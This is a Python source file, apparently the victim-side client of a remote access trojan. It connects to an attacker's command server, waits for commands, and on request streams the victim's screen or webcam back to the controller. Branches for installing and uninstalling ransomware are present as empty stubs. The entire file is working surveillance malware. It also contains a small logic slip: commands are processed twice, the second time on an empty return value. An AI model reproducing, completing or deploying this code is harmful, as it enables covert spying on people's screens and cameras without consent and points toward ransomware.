import threading
from victim_constants import *
import socket
import ScreenSharing.host.host as screenSharingHost
import WebCamSharing.host.host as webCamSharingHost

soc = None

def connectToServer():
    print("Connecting to host...")

    global soc
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    soc.connect((HOST_IP, HOST_PORT))
    
    print("Successfully connected!")

def getCommand():
    command = soc.recv(1024).decode()
    print(f"Recv command! : {command}")
    processCommand(command)

def processCommand(command):
    if command == WATCH_SCREEN_COMMAND:
        threading.Thread(target=screenSharingHost.main, kwargs={'ip' : SCREEN_SHARING_IP, 'port' : SCREEN_SHARING_PORT, 'closeAfterNConnection' : True}).start()
        soc.send(f"{SCREEN_SHARING_IP} {SCREEN_SHARING_PORT}".encode())

    elif command == WATCH_WEBCAM_COMMAND:
        threading.Thread(target=webCamSharingHost.main, kwargs= {'ip' : WEB_CAM_IP, 'port' : WEB_CAM_PORT, 'closeAfterNConnection' : True}).start()
        soc.send(f"{WEB_CAM_IP} {WEB_CAM_PORT}".encode())

    elif command == INSTALL_RANSOMWARE_COMMAND:
        pass

    elif command == UNINSTALL_RANSOMWARE_COMMAND:
        pass


def main():
    connectToServer()

    while True:
        command = getCommand()
        processCommand(command)

if __name__ == "__main__":
    main()